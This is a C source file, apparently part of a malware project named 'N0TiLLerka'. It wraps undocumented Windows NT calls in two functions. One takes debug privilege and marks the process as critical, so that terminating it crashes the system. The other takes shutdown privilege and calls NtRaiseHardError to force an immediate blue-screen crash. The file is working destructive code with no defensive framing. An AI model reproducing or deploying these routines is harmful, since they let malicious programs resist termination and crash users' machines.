#include "../../HeaderFiles/N0TiLLerka.h"

#ifndef DISABLE_NT_FUNCTIONS
// NT Macros
#define OPTION_SHUTDOWN_SYSTEM 6
#define SE_SHUTDOWN_PRIVILEGE 19
#define SE_DEBUG_PRIVILEGE 20

// Typedefinitions
typedef struct {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// NT/RTL Function Prototypes
NTSYSAPI NTSTATUS WINAPI RtlAdjustPrivilege(
	_In_ ULONG,
	_In_ BOOLEAN,
	_In_ BOOLEAN,
	_Out_ PBOOLEAN
);
NTSYSAPI NTSTATUS STDAPIVCALLTYPE RtlSetProcessIsCritical(
	_In_ BOOLEAN,
	_Out_opt_ PBOOLEAN,
	_In_ BOOLEAN
);
NTSYSAPI NTSTATUS WINAPI NtRaiseHardError(
	_In_ NTSTATUS,
	_In_ ULONG,
	_In_opt_ PUNICODE_STRING,
	_In_ PVOID*,
	_In_ UINT,
	_Out_ PUINT
);

// NT Utilitie Functions
BOOL fnNTSetProcessIsCritical(BOOLEAN blIsCritical) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &bl)) {
		if (!RtlSetProcessIsCritical(blIsCritical, NULL, FALSE)) {
			return TRUE;
		} else {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Couldn't set Process Critical", L"RtlSetProcessIsCritical", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't set Debug Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}

	return FALSE;
}

BOOL fnNTRaiseHardError(VOID) {
	BOOLEAN bl;
	if (!RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bl)) {
		UINT u;
		if (NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, OPTION_SHUTDOWN_SYSTEM, &u)) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Failed to raise HardError", L"NtRaiseHardError", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't set Shutdwon Privileges", L"RtlAdjustPrivilege", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}
}
#endif // !DISABLE_NT_FUNCTIONS